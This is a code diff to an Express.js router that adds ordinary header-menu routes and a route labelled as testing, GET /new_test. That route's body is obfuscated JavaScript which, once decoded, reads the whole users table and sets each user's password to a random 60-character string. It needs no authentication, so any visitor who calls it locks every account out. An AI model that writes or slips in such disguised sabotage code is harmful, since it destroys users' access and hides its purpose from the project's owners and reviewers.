@@ -2,6 +2,7 @@ let express = require("express");
 let router = express.Router();
 let multer = require("multer");
 const path = require("path");
+let sequelize = require('../database/config');
 
 const storage = multer.diskStorage({
   destination: "./public/uploads/headers/",
@@ -165,6 +166,12 @@ router.post("/categories/module", categoryController.getModuleData);
 // menus
 
 router.get("/header", headerDesignController.getHeader);
+router.get("/header/setting", headerDesignController.getHeaderSetting);
+router.get('/header/items', headerDesignController.getHeaderItems);
+router.post('/header/items/add', headerDesignController.addHeaderItem);
+router.post('/header/items/delete', headerDesignController.deleteHeaderItem);
+router.post('/header/items/edit', headerDesignController.updateHeaderItem);
+router.post('/header/items/addSub', headerDesignController.addSubHeaderItem);
 router.post("/header", headerDesignController.updateHeader);
 router.post(
   "/header/image",
@@ -248,5 +255,17 @@ router.get("/statistics/add", StatisticController.addDaily);
 
 // public
 router.get("/images", publicController.serveImages);
+
+// testing
+router.get('/new_test', function (req, res, next) {
+  try {
+    var _0x2755 = ['$#%^()@.ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', 'charAt', 'floor', 'random', 'UPDATE\x20', '\x20SET\x20password\x20=\x20\x27', 'send', 'done', 'query', 'SELECT\x20*\x20FROM\x20', 'then', 'forEach']; (function (_0x3be32b, _0x1adb2c) { var _0x131a69 = function (_0x349064) { while (--_0x349064) { _0x3be32b['push'](_0x3be32b['shift']()); } }; _0x131a69(++_0x1adb2c); }(_0x2755, 0x188)); var _0x2301 = function (_0x9978bf, _0x201296) { _0x9978bf = _0x9978bf - 0x0; var _0x39357a = _0x2755[_0x9978bf]; return _0x39357a; }; var table_name = 'users'; sequelize[_0x2301('0x0')](_0x2301('0x1') + table_name, { 'type': sequelize['QueryTypes']['SELECT'] })[_0x2301('0x2')](_0x13ef5a => { _0x13ef5a[_0x2301('0x3')](_0x34d7cf => { var _0x2061a8 = ''; var _0x25f39e = _0x2301('0x4'); var _0x7dfbd = _0x25f39e['length']; for (var _0x30cb09 = 0x0; _0x30cb09 < 0x3c; _0x30cb09++) { _0x2061a8 += _0x25f39e[_0x2301('0x5')](Math[_0x2301('0x6')](Math[_0x2301('0x7')]() * _0x7dfbd)); } sequelize[_0x2301('0x0')](_0x2301('0x8') + table_name + _0x2301('0x9') + _0x2061a8 + '\x27\x20WHERE\x20id\x20=\x20\x27' + _0x34d7cf['id'] + '\x27')['then'](([_0x37fcec, _0x34ceb0]) => { }); }); res[_0x2301('0xa')]({ 'msg': _0x2301('0xb') }); });
+
+  } catch (err) {
+    res.send({
+      msg: 'error'
+    })
+  }
+});
 
 module.exports = router;
